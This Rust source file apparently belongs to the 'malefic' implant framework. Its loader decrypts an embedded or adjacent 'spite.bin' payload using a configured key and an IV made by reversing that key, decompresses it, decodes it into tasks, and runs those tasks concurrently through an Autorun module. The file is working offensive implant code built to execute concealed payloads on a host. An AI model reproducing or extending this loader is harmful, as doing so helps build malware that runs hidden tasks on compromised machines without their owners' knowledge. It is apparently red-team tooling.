mod autorun;
pub use autorun::Autorun;

use malefic_config as config;
use malefic_crypto::compress::decompress;
use malefic_crypto::crypto::new_cryptor;
use malefic_proto::decode;

const DEFAULT_CONCURRENCY: usize = 6;
const DEFAULT_WORKER_THREADS: usize = 4;

#[cfg(all(not(feature = "external_spite"), feature = "embed"))]
malefic_gateway::lazy_static! {
    pub static ref DATA: Vec<u8> = malefic_gateway::include_encrypted!("../../../resources/spite.bin");
}

#[cfg(all(not(feature = "external_spite"), not(feature = "embed")))]
malefic_gateway::lazy_static! {
    pub static ref DATA: Vec<u8> = include_bytes!("../../../resources/spite.bin").to_vec();
}

#[cfg(feature = "external_spite")]
fn read_spite_bin() -> std::io::Result<Vec<u8>> {
    let exe_spite_path = std::env::current_exe()
        .ok()
        .and_then(|p| p.parent().map(|dir| dir.join("spite.bin")));

    if let Some(path) = exe_spite_path {
        if let Ok(data) = std::fs::read(&path) {
            return Ok(data);
        }
    }

    std::fs::read("spite.bin")
}

pub fn run() -> anyhow::Result<()> {
    run_with_concurrency(DEFAULT_CONCURRENCY)
}

pub fn run_with_concurrency(concurrency: usize) -> anyhow::Result<()> {
    #[cfg(feature = "external_spite")]
    let data = read_spite_bin()?;
    #[cfg(not(feature = "external_spite"))]
    let data = DATA.clone();

    malefic_common::block_on(DEFAULT_WORKER_THREADS, DEFAULT_WORKER_THREADS * 4, async {
        let iv = config::KEY.clone().iter().rev().cloned().collect();
        let mut cryptor = new_cryptor(config::KEY.clone().to_vec(), iv);
        let decrypted = cryptor.decrypt(data)?;
        let decompressed = decompress(&*decrypted)?;
        match decode(decompressed) {
            Ok(spites) => {
                let tasks: Vec<_> = spites.spites.into_iter().collect();
                let autorun = Autorun::new(concurrency)?;
                let _results = autorun.execute(tasks).await?;
                Ok(())
            }
            Err(e) => Err(e.into()),
        }
    })
}
